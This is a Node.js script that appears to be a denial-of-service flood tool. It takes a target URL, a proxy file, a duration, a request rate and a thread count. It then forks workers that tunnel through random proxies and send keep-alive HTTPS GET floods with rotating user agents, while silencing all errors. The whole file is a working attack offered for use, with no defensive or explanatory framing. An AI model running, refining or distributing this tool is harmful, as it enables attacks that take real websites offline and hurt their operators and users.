process.on('uncaughtException', function (err) {
    //console.error(err)
});
process.on('unhandledRejection', function (err) {
    //console.error(err)
});
require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs');
const exec = require('child_process').exec;
const url = require('url');
var request = require('request');
var http = require('http');
var tls = require('tls');
const UserAgent = require('user-agents');
var path = require('path');
const cluster = require('cluster');
var fileName = __filename;
var file = path.basename(fileName);
if (process.argv.length < 7) {
    console.log('node ' + file + ' URL PROXIES TIME RATE THREADS');
    process.exit(0);
}

if (cluster.isMaster) {
    for (let i = 1; i <= process.argv[6]; i++) {
        cluster.fork();
        console.log(`Started ${i} threads.`);
    }
    console.log('Attack started!')
    setTimeout(() => {
        process.exit(1);
    }, process.argv[4] * 1000);
} else {
    start();
}
var proxies = fs.readFileSync(process.argv[3], 'utf-8').toString().replace(/\r/g, '').split('\n');
const splitedUrl = process.argv[2].split('""')[0];
var parsedUrl = url.parse(splitedUrl);
process.setMaxListeners(0);
function start() {
    setInterval(() => {
        const userAgentv1 = new UserAgent();
        var proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
        var tunnel = http.request({
            host: proxy[0],
            port: proxy[1],
            method: 'CONNECT',
            path: parsedUrl.host + ':443'
        }, (err) => {
            tunnel.end();
            return;
        });
        tunnel.on('connect', function (_, socket, _) {
            var conn = tls.connect({
                host: parsedUrl.host,
                servername: parsedUrl.host,
                secure: true,
                rejectUnauthorized: false,
                socket: socket
            }, function () {
                for (let i = 0; i < process.argv[5]; i++) {
                    conn.write('GET ' + parsedUrl.path + ' HTTP/1.1\r\nHost: ' + parsedUrl.host + '\r\nConnection: Keep-Alive\r\n' + 'User-Agent: ' + userAgentv1.toString() + '\r\n\r\n');
                }
            });
            conn.on('error', function (data) {
                conn.end();
                conn.destroy();
            });
        });
        tunnel.end();
    });
}